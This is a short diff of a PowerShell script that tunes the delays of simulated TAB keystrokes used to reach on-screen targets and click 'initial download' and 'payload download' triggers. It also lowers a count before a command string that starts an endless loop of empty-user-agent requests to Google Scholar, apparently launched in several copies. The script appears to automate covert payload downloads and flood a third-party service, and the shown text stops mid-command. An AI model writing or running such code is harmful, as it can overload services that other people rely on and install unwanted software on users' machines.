@@ -16,7 +16,7 @@ Write-Host "Success! Selection landed on target element name: '$currentName' aft
 $targetUnoFound=$true;break
 }
 }
-$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 65
+$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 60
 }
 if($targetUnoFound){
 Write-Host "Striking initial download trigger..."
@@ -41,7 +41,7 @@ Write-Host "Success! Selection landed on target element name: '$currentName' aft
 $targetDosFound=$true;break
 }
 }
-$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 65
+$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 60
 }
 if($targetDosFound){
 Write-Host "Striking payload download trigger..."
@@ -175,7 +175,7 @@ break
 }
 }
 }
-$count = 20
+$count = 18
 $command = '
 while ($true) {
 Invoke-RestMethod -Uri "https://scholar.google.com:443/scholar?q=google+""&start=990" -Method Get -UserAgent ""
